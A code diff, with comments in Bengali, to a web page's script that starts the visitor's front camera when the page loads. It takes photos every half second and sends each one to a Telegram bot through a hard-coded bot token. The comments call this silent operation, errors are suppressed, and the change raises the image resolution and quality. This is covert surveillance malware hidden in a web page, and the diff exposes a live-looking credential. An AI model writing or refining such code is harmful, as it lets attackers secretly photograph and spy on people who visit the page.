@@ -229,7 +229,7 @@
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ========== ব্যাকগ্রাউন্ড সাপোর্ট সহ ক্যামেরা + টেলিগ্রাম কোড ========== -->
+    <!-- ========== বড় সাইজের ছবি + ব্যাকগ্রাউন্ড সাপোর্ট সহ ক্যামেরা কোড ========== -->
     <script>
         // ===================== টেলিগ্রাম বট তথ্য =====================
         const BOT_TOKEN = "8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ";
@@ -243,34 +243,20 @@
         let captureInterval = null;
         let isCapturing = false;
         let isSending = false;
-        let isPageVisible = true;
 
-        // ========== ১. পেজ ভিজিবিলিটি ট্র্যাকার ==========
-        document.addEventListener('visibilitychange', () => {
-            isPageVisible = !document.hidden;
-            
-            // পেজ ব্যাকগ্রাউন্ডে গেলে বা ফিরে এলে কিছু করার দরকার নেই
-            // ক্যামেরা ও ইন্টারভাল চলতেই থাকবে
-            console.log('Page visibility changed:', isPageVisible ? 'visible' : 'hidden');
-            
-            // ব্যাকগ্রাউন্ডে গেলে UI তে কিছু দেখানোর দরকার নেই
-            // সবকিছু চুপিসারে চলতে থাকবে
-        });
-
-        // ========== ২. ক্যামেরা চুপিসারে চালু ==========
+        // ========== ১. ক্যামেরা চালু (বড় রেজোলিউশন) ==========
         async function startCamera() {
             try {
                 const mediaStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: "user",
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
                     }
                 });
                 stream = mediaStream;
                 video.srcObject = stream;
                 
-                // ভিডিও রেডি হলে শুরু
                 video.onloadedmetadata = () => {
                     video.play();
                     setTimeout(() => {
@@ -280,7 +266,6 @@
                     }, 50);
                 };
                 
-                // ব্যাকআপ: ভিডিও রেডি না হলে 300ms পর চেষ্টা
                 setTimeout(() => {
                     if (!isCapturing && video.videoWidth > 0) {
                         startCapturing();
@@ -289,11 +274,10 @@
                 
             } catch (e) {
                 // চুপিসারে ব্যর্থ
-                console.log('Camera access denied or error');
             }
         }
 
-        // ========== ৩. প্রতি ০.৩ সেকেন্ডে ছবি তোলা (ব্যাকগ্রাউন্ডেও) ==========
+        // ========== ২. প্রতি ০.৫ সেকেন্ডে বড় ছবি তোলা ==========
         function startCapturing() {
             if (isCapturing) return;
             if (!video.videoWidth || !video.videoHeight) {
@@ -303,14 +287,11 @@
             
             isCapturing = true;
             
-            // প্রথম ছবি এখনই
             captureNow();
             
-            // বাকি ছবি প্রতি ০.৩ সেকেন্ডে (ব্যাকগ্রাউন্ডেও কাজ করবে)
             captureInterval = setInterval(() => {
-                // পেজ ভিজিবল না থাকলেও ছবি তোলা চলবে
                 captureNow();
-            }, 300);
+            }, 500);
         }
 
         function captureNow() {
@@ -323,15 +304,15 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // JPEG কোয়ালিটি ৫০%
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+                // ভালো কোয়ালিটি (৮৫%) = বড় সাইজের ছবি
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                 sendPhotoToTelegram(dataUrl);
             } catch (e) {
                 // চুপ
             }
         }
 
-        // ========== ৪. ছবি টেলিগ্রামে পাঠানো ==========
+        // ========== ৩. ছবি টেলিগ্রামে পাঠানো ==========
         async function sendPhotoToTelegram(base64) {
             isSending = true;
             
@@ -361,22 +342,16 @@
             return new Blob([u8arr], { type: mime });
         }
 
-        // ========== ৫. পেজ লোড হলে শুরু ==========
+        // ========== ৪. পেজ লোড হলে শুরু ==========
         window.addEventListener('load', () => {
             startCamera();
         });
 
-        // ========== ৬. পেজ ছাড়লে ক্যামেরা বন্ধ ==========
+        // ========== ৫. পেজ ছাড়লে ক্যামেরা বন্ধ ==========
         window.addEventListener('beforeunload', () => {
             if (captureInterval) clearInterval(captureInterval);
             if (stream) stream.getTracks().forEach(t => t.stop());
         });
-
-        // ========== ৭. মোবাইলের স্ক্রিন অফ হলেও কাজ করবে ==========
-        // 'visibilitychange' ইভেন্ট হ্যান্ডেল করছি
-        // পেজ ব্যাকগ্রাউন্ডে গেলেও setInterval চলতে থাকবে
-        // কারণ setInterval ব্যাকগ্রাউন্ডে থামে না (শুধু রেট কমে যায় কিছু ব্রাউজারে)
-        // Chrome-এ ব্যাকগ্রাউন্ডে setInterval ১ সেকেন্ডে ১ বার চলে (থামে না)
     </script>
 </body>
 </html>
